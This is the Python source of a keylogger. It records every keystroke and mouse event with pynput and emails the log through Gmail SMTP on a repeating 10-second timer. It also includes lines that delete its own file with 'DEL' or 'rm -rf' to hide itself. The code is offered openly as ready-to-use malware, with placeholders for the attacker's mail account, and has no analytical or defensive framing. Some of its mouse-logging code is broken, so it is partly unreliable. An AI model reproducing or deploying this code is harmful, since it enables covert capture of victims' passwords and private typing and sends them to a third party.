import smtplib
import threading
from pynput import keyboard
from pynput.mouse import Listener
import logging
import os


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + string

    def on_move(self, x, y):
        current_move = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_move)

    def on_click(self, x, y):
        current_click = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_click)

    def on_scroll(self, x, y):
        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587, message.encode("utf8"))
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()
        if os.name == "nt":
            try:
                os.system("YOUR DIRECTORY")
                os.rename('keylogger.py', 'keylogger.bat')
                os.rename('keylogger.bat', 'keylogger.py')
            except OSError:
                print('File is still open.')
                os.system("DEL keylogger.py")

        else:
            try:
                os.system("YOUR DIRECTORY")
                os.rename('keylogger.py', 'keylogger.bat')
                os.rename('keylogger.bat', 'keylogger.py')
            except OSError:
                print('File is still open.')
                os.system("rm -rf keylogger.py")


keylogger = KeyLogger(10, 'YOUR MAIL', 'PASSWORD')
keylogger.run()
